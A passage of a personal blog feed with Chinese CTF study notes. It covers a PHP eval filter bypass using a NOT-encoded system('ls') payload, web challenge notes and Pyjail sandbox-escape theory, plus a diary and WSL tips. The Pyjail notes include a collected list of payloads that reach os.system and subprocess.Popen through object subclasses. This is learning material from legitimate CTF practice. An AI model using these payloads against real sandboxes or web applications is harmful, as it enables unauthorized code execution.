class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空白符（空格、<code>\t</code>、<code>\r</code>、<code>\n</code>）、<code>+[]^&quot;-*$?&lt;&gt;=</code> 反引号以及所有字母（<code>a-zA-Z</code>）。</p><p>由于过滤了字母和大量符号，可以考虑使用：</p><ul><li>异或构造（<code>^</code>被过滤，需要其他方式）</li><li>取反构造（<code>~</code>未被过滤）</li><li>自增构造（<code>++</code>被过滤，<code>+</code>单独被过滤）</li><li>数字与符号组合</li></ul><p>使用取反构造绕过，类似 lab25 的方法。由于可以使用 <code>~</code>、<code>()</code>、<code>;</code>、<code>|</code>、<code>&amp;</code> 等符号，可以通过 URL 编码后的取反字符串来执行命令。</p><p>构造思路：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E);  <span class="comment">// system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure><p>具体 payload 需要将目标函数名和参数分别取反后进行 URL 编码。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar-2023</title>
      <link href="/2025/09/09/NewStar-2023/"/>
      <url>/2025/09/09/NewStar-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="New-Star-2023"><a href="#New-Star-2023" class="headerlink" title="New-Star-2023"></a>New-Star-2023</h1><h2 id="检查和查看页面源代码的区别"><a href="#检查和查看页面源代码的区别" class="headerlink" title="检查和查看页面源代码的区别"></a>检查和查看页面源代码的区别</h2><ul><li><p><strong>查看页面源代码（View Source）</strong></p><ul><li>看的是：<strong>服务器最初返回的原始 HTML 文本</strong>。</li><li>时间点：<strong>页面加载瞬间</strong>的快照（不执行 JS 的结果）。</li><li>特性：只展示初始 HTML；后续通过 JS 动态插入&#x2F;修改的节点<strong>看不到</strong>。不交互、只读。</li><li>适合：看服务器端是否输出了某段标记（SSR&#x2F;SEO 检查）、确认初始结构、了解响应体。</li></ul></li><li><p><strong>检查 &#x2F; 检查元素（Inspect &#x2F; DevTools）</strong></p><ul><li>看的是：<strong>浏览器当前内存里的“活的” DOM</strong>（包含 JS 动态改动、异步加载后的内容）。</li><li>时间点：<strong>此刻</strong>（可随脚本和你的操作实时变化）。</li><li>特性：可展开&#x2F;编辑 DOM、看&#x2F;改 CSS、看事件监听、调试 JS、看 Network&#x2F;性能&#x2F;存储等。</li><li>适合：排版样式问题、元素布局与盒模型、脚本错误、接口请求、SPA&#x2F;CSR 页面结构。</li></ul></li></ul><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>题目给的是web根目录有文件泄露。考验路径扫描</p><h3 id="对网页进行路径扫描"><a href="#对网页进行路径扫描" class="headerlink" title="对网页进行路径扫描"></a>对网页进行路径扫描</h3><ul><li>工具：<code>ffuf</code>、<code>gobuster</code>、<code>dirsearch</code>、<code>wfuzz</code></li><li>字典：待找</li></ul><h4 id="ffuf-使用方法"><a href="#ffuf-使用方法" class="headerlink" title="ffuf 使用方法"></a>ffuf 使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /path/to/wordlist -u http://example.com/FUZZ</span><br></pre></td></tr></table></figure><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E"></a>R!C!E</h2><ul><li>用 json 传 post 竟然不会被 <code>_POST[&#39;key&#39;]</code> 读取到</li><li>对于 post 的 key 来说 <code>_</code> 可能是非法字符，直接无法直接通过 <code>x-www-form-urlencoded</code> 传递，需要将 <code>e_v.a.l</code> 里面的 <code>_</code> 号换成 <code>[</code></li><li><a href="https://zhuanlan.zhihu.com/p/391439312">针对远程代码执行漏洞的破解</a> 注：可行性堪忧，待验证</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewStar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar-2024</title>
      <link href="/2025/09/09/NewStar-2024/"/>
      <url>/2025/09/09/NewStar-2024/</url>
      
        <content type="html"><![CDATA[<h1 id="New-Star-2024"><a href="#New-Star-2024" class="headerlink" title="New Star 2024"></a>New Star 2024</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="PangBai-过家家（1）"><a href="#PangBai-过家家（1）" class="headerlink" title="PangBai 过家家（1）"></a>PangBai 过家家（1）</h3><p>很麻烦 ：）</p><p>每个故事给一段flag，最后需要base64decode</p><h4 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h4><p>隐藏在 headers 的 location 字段里</p><h4 id="Q2、Q3、Q4"><a href="#Q2、Q3、Q4" class="headerlink" title="Q2、Q3、Q4"></a>Q2、Q3、Q4</h4><p>通过get、post、cookie传递参数</p><p>POST 的查询类型有很多种，通过 HTTP 报文中的 Content-Type 指定，以告诉服务端用何种方式解析报文 Body 的内容。</p><table><thead><tr><th>Content-Type</th><th>描述</th></tr></thead><tbody><tr><td>application&#x2F;x-www-form-urlencoded</td><td>和 GET 查询字段的写法一样，开头不需要 ?，用 &amp; 符号连接各查询参数，遇到特殊字符需要进行转义。</td></tr><tr><td>application&#x2F;json</td><td>Body 给出一个 JSON 格式的数据，服务端会解析它。</td></tr><tr><td>multipart&#x2F;form-data</td><td>表单字段，一般用于有文件等复杂类型的场景。</td></tr></tbody></table><p>post 发送的请求内容不需要携带<code>&#39;&#39;</code></p><h4 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h4><h4 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h4><p>JWT 是 JSON Web Token 的缩写，是一种用于在网络应用环境中传递声明的紧凑且自包含的方式。它通常用于身份验证和信息交换。</p><ul><li>结构：由三部分组成，分别是头部（Header）、载荷（Payload）和签名（Signature），格式为 <code>header.payload.signature</code>。</li><li>编码：头部和载荷部分使用 Base64Url 编码，签名部分是对前两部分进行签名生成的。</li></ul><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="你能在1s内打出8句英文吗"><a href="#你能在1s内打出8句英文吗" class="headerlink" title="你能在1s内打出8句英文吗"></a>你能在1s内打出8句英文吗</h3><h4 id="session"><a href="#session" class="headerlink" title="session()"></a>session()</h4><p>使用session()函数来启动一个会话，允许你在多个请求之间存储和检索数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">response = session.get(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h3><h4 id="SSTI-注入"><a href="#SSTI-注入" class="headerlink" title="SSTI 注入"></a>SSTI 注入</h4>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewStar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大二日记-暑期集训</title>
      <link href="/2025/08/31/%E5%A4%A7%E4%BA%8C%E6%97%A5%E8%AE%B0-%E6%9A%91%E6%9C%9F%E9%9B%86%E8%AE%AD/"/>
      <url>/2025/08/31/%E5%A4%A7%E4%BA%8C%E6%97%A5%E8%AE%B0-%E6%9A%91%E6%9C%9F%E9%9B%86%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="大二日记-暑期集训"><a href="#大二日记-暑期集训" class="headerlink" title="大二日记-暑期集训"></a>大二日记-暑期集训</h1><p>大二生活就这样开始了，不知不觉也成了学校的老登。</p><p>集训的生活倒是没啥可说的，听课效率和正常别无二致，基本上是在写布置的作业。每天都对着 vscode 在键盘上敲击，一天也就过去了。</p><p>贪吃蛇对抗赛倒是很有趣的结课活动，也算得上是信院的悠久历史传统了，基本从零开始写的程序甚至比 cs61b 上写的 gitlet 更让人印象深刻。搜索、寻路、博弈也确实让我看到了算法在竞赛之外的活力。</p><p>同时这应该也算是我大量使用 ai 辅助编程的开始。微软真是大善人，免费 copilot pro 用到爽。但确实会发现当脑子里没有规划，只是一味得用自然语言向 ai 描述自己的问题时，得到的结果往往不尽如人意。毕竟 ai 也只是个工具，不能完全代替人类的思考。于是到最后我就得到了一个 3000 行的 shit。在决赛暴毙两次遗憾三等奖。</p><p>ai 的弊病包括但不限于：</p><ol><li>给的文档是不看的</li><li>要求修改代码是偷懒的</li></ol><p>比完贪吃蛇紧接着就是国赛，无奈三个人对统计毫无准备一窍不通，只得选择 A 题。</p><p>静待结果吧</p><p>比完赛以后三人以 89 元汉堡自助结束，小食难吃，汉堡还行，总体来说不如 kfc。我的大一就这样在晚风中画上了句号。</p>]]></content>
      
      
      <categories>
          
          <category> 大二 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl常用</title>
      <link href="/2025/08/31/wsl%E5%B8%B8%E7%94%A8/"/>
      <url>/2025/08/31/wsl%E5%B8%B8%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="wsl-运行情况"><a href="#wsl-运行情况" class="headerlink" title="wsl 运行情况"></a>wsl 运行情况</h2><h3 id="查看已安装的发行版"><a href="#查看已安装的发行版" class="headerlink" title="查看已安装的发行版"></a>查看已安装的发行版</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --list --verbose</span><br></pre></td></tr></table></figure><h2 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h2><h3 id="网络配置问题"><a href="#网络配置问题" class="headerlink" title="网络配置问题"></a>网络配置问题</h3><p>获取网络配置, wsl 端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslinfo --networking-mode</span><br></pre></td></tr></table></figure><h3 id="获取-wsl-ip"><a href="#获取-wsl-ip" class="headerlink" title="获取 wsl ip"></a>获取 wsl ip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;https://ipinfo.io?token=<span class="variable">$IPINFO_TOKEN</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="apt-不会自动使用-windows-代理，即使是在虚拟网卡加-mirrored-模式"><a href="#apt-不会自动使用-windows-代理，即使是在虚拟网卡加-mirrored-模式" class="headerlink" title="apt 不会自动使用 windows 代理，即使是在虚拟网卡加 mirrored 模式"></a>apt 不会自动使用 windows 代理，即使是在虚拟网卡加 mirrored 模式</h3><ol><li><p>设置代理:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://localhost:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://localhost:7890&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>测试 apt 的网络连接方式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update -o Debug::Acquire::http=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>但<code>sudo</code>默认不会继承用户环境变量，解决方法：</p><ol><li><p>在 <code>/etc/apt/apt.conf.d/</code> 下新建一个配置文件，例如 <code>/etc/apt/apt.conf.d/proxy.conf</code>，但配置完成后重新使用<code>sudo apt update -o Debug::Acquire::http=true</code>速度明显变快但仍是 GET 直接访问，（不懂）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Acquire &#123;</span><br><span class="line">HTTP::proxy <span class="string">&quot;http://localhost:7890&quot;</span>;</span><br><span class="line">HTTPS::proxy <span class="string">&quot;http://localhost:7890&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h2><h3 id="输出绝对路径"><a href="#输出绝对路径" class="headerlink" title="输出绝对路径"></a>输出绝对路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">realpath</span> ~/node_modules/prettier</span><br></pre></td></tr></table></figure><h2 id="寻找某个命令的位置"><a href="#寻找某个命令的位置" class="headerlink" title="寻找某个命令的位置"></a>寻找某个命令的位置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> &lt;<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="GUI-桌面"><a href="#GUI-桌面" class="headerlink" title="GUI 桌面"></a>GUI 桌面</h2><h3 id="kali-linux"><a href="#kali-linux" class="headerlink" title="kali-linux"></a>kali-linux</h3><p>inside wsl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex --win -s</span><br></pre></td></tr></table></figure><p>then input your password, success!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pyjail 练习</title>
      <link href="/2025/08/26/Pyjail-%E7%BB%83%E4%B9%A0/"/>
      <url>/2025/08/26/Pyjail-%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)</h2><p>过滤了 ‘ “ i b</p><p>考虑使用 <code>chr()</code> 拼接字符串</p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)</h2><p>限制字符串长度</p><p>使用 <code>input()</code> 读取输入</p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)</h2><p>限制字符串长度同时过滤了<code>exec</code> <code>eval</code> <code>input()</code></p><p>考虑使用 unicode 碰撞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let<span class="string">&#x27;s have an beginner jail of calc</span></span><br><span class="line"><span class="string">Enter your expression and I will evaluate it for you.</span></span><br><span class="line"><span class="string">&gt; 𝓮val(inp𝓾t())</span></span><br><span class="line"><span class="string">Oh hacker!</span></span><br></pre></td></tr></table></figure><p>原因未知</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pyjail学习笔记_基础内容篇</title>
      <link href="/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E7%AF%87/"/>
      <url>/2025/08/13/pyjail%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h2><p><code>builtins</code> 是 Python 的内置模块，提供了一些常用的函数和对象。</p><h2 id="内省机制-Introspection"><a href="#内省机制-Introspection" class="headerlink" title="内省机制 (Introspection)"></a>内省机制 (Introspection)</h2><p>内省机制允许程序在运行时检查对象的类型和属性。</p><h3 id="dir"><a href="#dir" class="headerlink" title="dir()"></a><code>dir()</code></h3><p><code>dir()</code> 函数用于查找对象的属性和方法。它返回一个包含对象所有可用属性和方法名称的列表。</p><h3 id="type"><a href="#type" class="headerlink" title="type()"></a><code>type()</code></h3><p><code>type()</code> 函数用于返回对象的类型。它可以用于检查变量的类型或获取对象的类信息。</p><h3 id="getattr-setattr-hasattr-delattr"><a href="#getattr-setattr-hasattr-delattr" class="headerlink" title="getattr()&#x2F;setattr()&#x2F;hasattr()&#x2F;delattr()"></a><code>getattr()</code>&#x2F;<code>setattr()</code>&#x2F;<code>hasattr()</code>&#x2F;<code>delattr()</code></h3><p>这些内置函数用于获取、设置、检查和删除对象的属性。</p><h3 id="help"><a href="#help" class="headerlink" title="help()"></a><code>help()</code></h3><p><code>help()</code> 函数用于查看对象的帮助文档。它可以提供有关对象的详细信息，包括方法、属性和用法示例。</p><h3 id="globals-locals"><a href="#globals-locals" class="headerlink" title="globals()&#x2F;locals()"></a><code>globals()</code>&#x2F;<code>locals()</code></h3><p><code>globals()</code> 函数用于返回当前全局符号表的字典，包含所有全局变量和函数。</p><p><code>locals()</code> 函数用于返回当前局部符号表的字典，包含所有局部变量和函数。</p><h3 id="vars"><a href="#vars" class="headerlink" title="vars()"></a><code>vars()</code></h3><p><code>vars()</code> 函数用于返回对象的 <code>__dict__</code> 属性，即对象的属性字典。</p><h2 id="python-魔术方法"><a href="#python-魔术方法" class="headerlink" title="python 魔术方法"></a>python 魔术方法</h2><p>魔术方法是 Python 中以双下划线开头和结尾的方法。这些方法也被称为“特殊方法”或“dunder 方法”。它们允许开发者自定义类的行为，例如对象的创建、表示和运算等。</p><h3 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h3><ul><li><code>__init__(self, ...)</code>：构造方法，用于初始化对象。</li><li><code>__str__(self)</code>：返回对象的字符串表示，用于 <code>print()</code> 函数。</li><li><code>__repr__(self)</code>：返回对象的官方字符串表示，用于调试。</li><li><code>__len__(self)</code>：返回对象的长度，用于 <code>len()</code> 函数。</li><li><code>__getitem__(self, key)</code>：支持索引访问，用于 <code>obj[key]</code>。</li><li><code>__setitem__(self, key, value)</code>：支持索引赋值，用于 <code>obj[key] = value</code>。</li><li><code>__delitem__(self, key)</code>：支持索引删除，用于 <code>del obj[key]</code>。</li><li><code>__iter__(self)</code>：返回可迭代对象，用于 <code>for</code> 循环。</li><li><code>__next__(self)</code>：返回下一个迭代值，用于迭代器。</li></ul><h3 id="builtins-1"><a href="#builtins-1" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h3><p><code>__builtins__</code> 是一个包含所有内置对象的模块，包括内置函数、异常和其他对象。可以通过 <code>import builtins</code> 访问。</p><h3 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h3><p><code>__import__</code> 是一个内置函数，用于动态导入模块。它接受模块名称作为字符串，并返回模块对象。</p><p>如 import sys 相当于<code>__import__(&#39;sys&#39;)</code>，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式 Bypass 过滤</p><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p>用于返回对象的类。</p><h3 id="base"><a href="#base" class="headerlink" title="__base__"></a><code>__base__</code></h3><p><code>__base__</code> 是一个属性，用于返回类的直接基类。</p><h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p><code>__mro__</code> 是一个属性，用于返回类的继承关系（方法解析顺序）。类似于 <code>__bases__</code>，但 <code>__mro__</code> 包含了所有基类，而不仅仅是直接基类。</p><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p><code>__globals__</code> 是一个属性，能够以 <code>dict</code> 的形式返回函数（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 <code>modules</code>。</p><h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__"></a><code>__subclasses__</code></h3><p><code>__subclasses__</code> 是一个方法，用于返回当前类的所有子类。</p><h3 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h3><p><code>__dict__</code> 是一个特殊的属性，它以字典形式存储对象的可写属性。每个对象（包括类、实例、模块等）都有自己的 <code>__dict__</code> 属性，通常用于保存该对象的命名空间，即与该对象相关的所有属性和值。</p><h2 id="no-builtins-构造"><a href="#no-builtins-构造" class="headerlink" title="no-builtins 构造"></a>no-builtins 构造</h2><p>在没有内置函数的情况下，可以通过 python 内省机制来绕过限制，通过内置类重新获取 <code>__builtins</code> ，然后再利用。</p><h3 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h3><ol><li>获取 <code>object</code> 类</li><li>通过 <code>__subclasses__</code> 获取所有子类</li><li>在子类中查找重载过<code>__init__</code>函数的类，因为重载过<code>__init__</code>函数的<code>__globals__</code>属性会包含<code>__builtins__</code>键或其他可利用参数<ol><li>利用<code>__builtins__</code><ol><li>通过 <code>.__init__.__globals__[&#39;__builtins__&#39;]</code> 键获取到 builtins 模块</li><li>由于 builtins 模块中包含了 file, eval 等函数,最后一步就是调用这些函数.</li></ol></li><li>利用其他函数. 因为 <code>__globals__</code> 中也会包含已经导入的模块,所以在某些子类的 <code>.__init__.__globals__</code> 中也会发现诸如 <code>os</code> 模块的身影,因此直接调用即可.</li></ol></li></ol><h4 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h4><h5 id="如何寻找重载过-init-函数的类？"><a href="#如何寻找重载过-init-函数的类？" class="headerlink" title="如何寻找重载过__init__函数的类？"></a>如何寻找重载过<code>__init__</code>函数的类？</h5><p>找到重载过的<code>__init__</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__</span><br></pre></td></tr></table></figure><p>在获取初始化属性后，带 <code>wrapper</code> 的说明没有重载，寻找不带 <code>warpper</code> 的，因为<code>wrapper</code>是指这些函数并没有被重载，这时它们并不是 function ，不具有<code>__globals__</code>属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._WeakValueDictionary&#x27;</span>&gt; &lt;function _WeakValueDictionary.__init__ at <span class="number">0x00000269A1321260</span>&gt; <span class="comment"># 重载过</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt; &lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;type&#x27;</span> objects&gt; <span class="comment"># 未重载过</span></span><br></pre></td></tr></table></figure><h4 id="playload-收集"><a href="#playload-收集" class="headerlink" title="playload 收集"></a>playload 收集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> == x.__init__.__globals__[<span class="string">&quot;__name__&quot;</span>] ][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;os.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#subprocess</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;subprocess&quot;</span> == x.__init__.__globals__[<span class="string">&quot;__name__&quot;</span>] ][<span class="number">0</span>][<span class="string">&quot;Popen&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;subprocess.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&#x27;Popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#builtins</span></span><br><span class="line"><span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span 